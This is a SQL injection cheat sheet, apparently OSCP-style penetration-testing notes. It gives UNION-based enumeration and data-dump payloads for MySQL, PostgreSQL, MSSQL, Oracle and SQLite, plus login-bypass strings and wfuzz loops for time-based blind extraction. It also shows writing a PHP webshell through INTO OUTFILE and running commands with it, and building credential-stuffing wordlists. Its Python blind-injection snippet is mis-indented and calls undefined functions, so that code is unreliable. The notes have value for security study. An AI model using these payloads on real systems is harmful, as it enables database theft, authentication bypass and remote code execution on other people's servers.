# SQLi Methodology

# SQL Injection Cheat Sheet

Complete SQL injection payloads for authorized penetration testing across all major database systems.

---

## MySQL/MariaDB

### 1. Error-Based Tests
```sql
' OR 1=1-- -
' AND 1=2 UNION SELECT NULL-- -
```

### 2. Sort Columns (Find Maximum Column Count)
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```
*Continue incrementing until error occurs*

**Alternative: UNION Method**
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

### 3. Find Version
```sql
' UNION SELECT NULL,@@version-- -
' UNION SELECT NULL,version()-- -
```

### 4. Find Database Name
```sql
' UNION SELECT NULL,database()-- -
```

### 5. Find Current User
```sql
' UNION SELECT NULL,user()-- -
' UNION SELECT NULL,current_user()-- -
```

### 6. Find Databases
```sql
' UNION SELECT NULL,schema_name FROM information_schema.schemata-- -
```

### 7. Find Tables from Database
```sql
' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='database_name'-- -
```

### 8. Find Columns from Table
```sql
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='table_name'-- -
```

### 9. Dump Data
```sql
' UNION SELECT NULL,CONCAT(column1,':',column2) FROM database_name.table_name-- -
```

---

## PostgreSQL

### 1. Error-Based Tests
```sql
' OR 1=1-- -
' AND 1=CAST(1 AS int)-- -
```

### 2. Sort Columns (Find Maximum Column Count)
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```
*Continue incrementing until error occurs*

### 3. Find Version
```sql
' UNION SELECT NULL,version()-- -
```

### 4. Find Database Name
```sql
' UNION SELECT NULL,current_database()-- -
```

### 5. Find Current User
```sql
' UNION SELECT NULL,current_user-- -
' UNION SELECT NULL,session_user-- -
```

### 6. Find Databases
```sql
' UNION SELECT NULL,datname FROM pg_database-- -
```

### 7. Find Tables from Database
```sql
' UNION SELECT NULL,tablename FROM pg_tables WHERE schemaname='public'-- -
```

### 8. Find Columns from Table
```sql
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='table_name'-- -
```

### 9. Dump Data
```sql
' UNION SELECT NULL,column1||':'||column2 FROM table_name-- -
```

---

## Microsoft SQL Server (MSSQL)

### 1. Error-Based Tests
```sql
' OR 1=1-- -
' AND 1=CONVERT(int,1)-- -
```

### 2. Sort Columns (Find Maximum Column Count)
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```
*Continue incrementing until error occurs*

### 3. Find Version
```sql
' UNION SELECT NULL,@@version-- -
```

### 4. Find Database Name
```sql
' UNION SELECT NULL,DB_NAME()-- -
```

### 5. Find Current User
```sql
' UNION SELECT NULL,SYSTEM_USER-- -
' UNION SELECT NULL,USER_NAME()-- -
```

### 6. Find Databases
```sql
' UNION SELECT NULL,name FROM master..sysdatabases-- -
' UNION SELECT NULL,name FROM sys.databases-- -
```

### 7. Find Tables from Database
```sql
' UNION SELECT NULL,name FROM database_name..sysobjects WHERE xtype='U'-- -
' UNION SELECT NULL,table_name FROM database_name.information_schema.tables-- -
```

### 8. Find Columns from Table
```sql
' UNION SELECT NULL,column_name FROM database_name.information_schema.columns WHERE table_name='table_name'-- -
```

### 9. Dump Data
```sql
' UNION SELECT NULL,column1+':'+column2 FROM database_name..table_name-- -
```

---

## Oracle

### 1. Error-Based Tests
```sql
' OR 1=1-- -
' AND 1=1-- -
```

### 2. Sort Columns (Find Maximum Column Count)
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```
*Continue incrementing until error occurs*

*Note: Oracle requires FROM dual or valid table*

### 3. Find Version
```sql
' UNION SELECT NULL,banner FROM v$version-- -
```

### 4. Find Database Name
```sql
' UNION SELECT NULL,instance_name FROM v$instance-- -
' UNION SELECT NULL,global_name FROM global_name-- -
```
*Note: Oracle uses SID instead of traditional database names*

### 5. Find Current User
```sql
' UNION SELECT NULL,USER FROM dual-- -
```

### 6. Find Databases/Schemas
```sql
' UNION SELECT NULL,username FROM all_users-- -
```

### 7. Find Tables from Schema
```sql
' UNION SELECT NULL,table_name FROM all_tables WHERE owner='SCHEMA_NAME'-- -
```

### 8. Find Columns from Table
```sql
' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='TABLE_NAME'-- -
```

### 9. Dump Data
```sql
' UNION SELECT NULL,column1||':'||column2 FROM table_name-- -
```

---

## SQLite

### 1. Error-Based Tests
```sql
' OR 1=1-- -
```

### 2. Sort Columns (Find Maximum Column Count)
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```
*Continue incrementing until error occurs*

### 3. Find Version
```sql
' UNION SELECT NULL,sqlite_version()-- -
```

### 4. Find Database Name
*N/A - SQLite uses file-based databases (single database per file)*

### 5. Find Current User
*N/A - SQLite has no user authentication concept*

### 6. Find Databases
*N/A - SQLite uses single database model*

### 7. Find Tables
```sql
' UNION SELECT NULL,name FROM sqlite_master WHERE type='table'-- -
```

### 8. Find Columns from Table
```sql
' UNION SELECT NULL,sql FROM sqlite_master WHERE type='table' AND name='table_name'-- -
```

### 9. Dump Data
```sql
' UNION SELECT NULL,column1||':'||column2 FROM table_name-- -
```

---

## Quick Reference Guide

### Comment Styles by Database
| Database | Comment Syntax |
|----------|----------------|
| MySQL | `-- -`, `#`, `/* */` |
| PostgreSQL | `--`, `/* */` |
| MSSQL | `--`, `/* */` |
| Oracle | `--`, `/* */` |
| SQLite | `--`, `/* */` |

### String Concatenation by Database
| Database | Concatenation Operator |
|----------|------------------------|
| MySQL | `CONCAT()` or `||` |
| PostgreSQL | `||` |
| MSSQL | `+` |
| Oracle | `||` |
| SQLite | `||` |

---

## Important Notes

⚠️ **Authorization Required**: These payloads are for authorized penetration testing only in controlled environments like OSCP labs.

🔍 **NULL Matching**: When using UNION attacks, you must match the exact number of columns in the original query. Use NULL placeholders and replace them one at a time to extract data.

📝 **Testing Workflow**:
1. Test for SQL injection vulnerability
2. Determine number of columns
3. Identify database type and version
4. Enumerate database structure
5. Extract sensitive data

🎯 **OSCP Tips**:
- Always document your findings
- Try multiple injection points (GET, POST, cookies, headers)
- Consider time-based and boolean-based blind injections if UNION doesn't work
- Use SQLmap when manual exploitation is time-consuming

---

*Last Updated: November 2025*
*For authorized security testing only*

### 1) Confirmation of a potential SQLi

    ' or 1=1 -- -

Alternatively, you can use BurpSuite Intruder with SQLi wordlists as well.

### 2) Find the number of columns in the table

MySQL

Repeat this input until you get a response from the server

    ' UNION SELECT 1 #
    ' UNION SELECT 1,2 #
    ' UNION SELECT 1,2,3 #
    ' UNION SELECT 1,2,3,4 #
    ' UNION SELECT 1,2,3,4,5 #
    ' UNION SELECT 1,2,3,4,5,6 #

PostgreSQL

    ' UNION SELECT NULL
    ' UNION SELECT NULL,NULL #
    ' UNION SELECT NULL,NULL,NULL #
    ' UNION SELECT NULL,NULL,NULL,NULL #
    ' UNION SELECT NULL,NULL,NULL,NULL,NULL #
    ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL #
    
Automated

    wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"

### 3) Find DB Version

MySQL

    ' UNION SELECT 1,2,3,4,5,version()

MSSQL

    ' UNION SELECT 1,2,3,4,5,@@version #

PostgreSQL

    ' UNION SELECT NULL,NULL,NULL,NULL,NULL,version()

### 4) Find Databases

MySQL

    ' union select 1,2,3,4,5,concat(schema_name) FROM information_schema.schemata #

PostgreSQL

    ' union select 1,2,3,4,5, datname from pg_database

### 5) Find tables names (DB=Users)



    ' union SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='Users' #

SQLite

    ' UNION SELECT name FROM sqlite_master WHERE type='table'-- -

### 6) Find the columns name of a table (Table=User)

    ' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'User' #

SQLite

    ' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='User'-- -

### 7) Dump data (group_concat(username,” | “,password))

    ' union select 1,2,3,4,5,group_concat(username," | ",password) From users.User #

SQLite

    ' UNION SELECT passwd FROM users-- -

### 8) Create wordlists for credential stuffing attacks

    cat creds | tr "," "\n" | cut -d " " -f 1 > user
    cat creds | tr "," "\n" | cut -d " " -f 3 > pass

Another thing to check in an SQLi is RCE capabilities (file write or OS command execution)

### 1) File write

    SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"

### 2) Execute payload on webserver

    https://target.com/webshell.php?cmd=id

## Various triggers for SQLi

### 1) Single Quote

    '

### 2) Double Quote

    "

## Blind SQLi

Determine database name

    for i in $(seq 1 10); do 
      wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
    done > <filename.txt> && grep "0m9" <filename.txt

    # Replace <filename.txt> with the name of the file to store results.
    # Replace 10 in $(seq 1 10) with the estimated length of the database name.
    # The FUZZ keyword is used by wfuzz to iterate through ASCII values.

Determine table name

    for i in $(seq 1 10); do 
      wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
    done > <filename.txt> && grep "0m9" <filename.txt

    # Replace table_name and table_schema with the actual names if targeting specific databases or tables.
    # Adjust LIMIT 0,1 to enumerate multiple tables by changing the first argument of LIMIT.

Determine column name

    for i in $(seq 1 10); do 
      wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
    done > <filename.txt> && grep "0m9" <filename.txt

    # Replace <table_name> with the actual table name you are targeting.
    # Adjust LIMIT 0,1 to retrieve column names for different tables.

Extract column content

    for i in $(seq 1 10); do 
      wfuzz -v -c -z range,0-10 -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZ2Z, SLEEP(10), NULL) --+"; 
    done > <filename.txt> && grep "0m9" <filename.txt

    # Replace <column_name> with the column you're trying to extract (e.g., username, password).
    # Replace <table_name> with the actual table name.
    # The FUZZ value iterates over possible row entries (use LIMIT FUZZ, 1 to iterate rows).

## Login Bypass

Standard OR-based bypass

    ' OR 1=1 --+

Bypass with LIMIT (useful when multiple entries might be returned)

    ' OR 1=1 LIMIT 1 --+

Bypass by using string comparison (a common trick when numeric bypass fails)

    ' OR 'a'='a --+

Using AND to combine conditions and exploit certain scenarios

    ' OR 3=3 --+

More obfuscated example (avoiding use of typical 1=1):

    ' OR 2=2 --+

Bypass with string comparison (works for both MySQL and MSSQL)

    ' OR 'a'='a' --+

OR-based bypass with a numeric comparison

    ' OR 3=3 --+

Bypass with LIMIT for MySQL (restricts to 1 entry)

    ' OR 1=1 LIMIT 1 --+

MSSQL version of limiting output with TOP

    ' OR 1=1; SELECT TOP 1 * FROM users --+

## SQL Truncation

Truncation-based SQL injection occurs when the database limits user input based on a specified length, discarding any characters beyond that limit. This can be exploited by an attacker to manipulate user data. For example, an attacker can create a new user with a name like 'admin' and their own password, potentially causing multiple entries for the same username. If both entries are evaluated as 'admin', the attacker could gain unauthorized access to the legitimate admin account.

In the following example, the database truncates the username after a certain length (e.g., 10 characters). The attacker uses this to create a conflicting account:

    # Example of truncation; the database discards extra characters
    username=admin++++++++(max.length)&password=testpwn123
    
    -- Assume the database has a 10-character limit on the username field, note that more characters are added because otherwise the truncation won't be made.
    username=admin++++++++&password=testpwn123
    
    -- The database truncates the input to admin and discards the extra characters
    -- If a user admin already exists, the attacker might be able to bypass authentication.

## Stored Procedures

### 1) Open SQL Server Management Studio, connect to the database, then go to:

    DB_NAME -> Programmability -> Stored Procedures

Right-click on Stored Procedures, then:

    Filter -> Filter Settings

Add the name of the Stored Procedure (without the dbo. part), then press OK.

### 2) Find interesting stored procedures and press:

    modify

### 3) If you find anything interesting, open Visual Studio and load the entire solution of the web app.

### 4) Try to find where the Stored Procedure is called within the code.

### 5) Check which function is located, check variables, and where it is called by clicking on:

    References

### 6) Try to reproduce the vulnerability.

## Blind SQL Injection Payloads

### 1) Python Code Snippets

Enumerate the number of databases

    i = 1
    while True:
        payload = generatePayload("0", "-13.37' or IF((SELECT COUNT(*) FROM information_schema.SCHEMATA)=" + str(i) + ", sleep(1),FALSE) or '2'='1")

        if (t2 - t1 > 1):
                    print("Number of databases on server: " + str(i))
                    break
                else:
                    i = i + 1

Dump database names

    def checkForDbName(index, currentDbName):
        payload = generatePayload("0", "-13.37' or IF((SELECT SUBSTRING(SCHEMA_NAME, 1, " + str(len(currentDbName)) + ")='" + currentDbName + "' FROM information_schema.SCHEMATA  LIMIT " + str(index) + ", 1 ), sleep(0.05),FALSE) or '2'='1")

    t1 = time.time()
    runExploit(cookies, "GARUMPAGE", payload, proxies)
    t2 = time.time()

    if (t2 - t1 > 0.5):
        return True
    else:
        return False

    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$_'
    namesOfDatabases = []
    numberOfDbs = 3
    
    for i in range(numberOfDbs):
        currentDbName = '0'
        if checkForDbName(i, 'information_schema'):
            namesOfDatabases.append('information_schema')
            print("Finally, database #" + str(i + 1) + " on server: information_schema")
            continue
        flagNoMoreChars = False
        while (not flagNoMoreChars):
            for j in range(len(chars)):
                currentDbName = currentDbName[:len(currentDbName) - 1] + chars[j]
                if checkForDbName(i, currentDbName):
                    print("database #" + str(i + 1) + " on server: " + currentDbName + "...")
                    currentDbName = currentDbName + '0'
                    flagNoMoreChars = False
                    break
                else:
                    flagNoMoreChars = True
        currentDbName = currentDbName[:len(currentDbName) - 1]
        print("Finally, database #" + str(i + 1) + " on server: " + currentDbName)
        namesOfDatabases.append(currentDbName)
    print("Databases: " + str(namesOfDatabases))

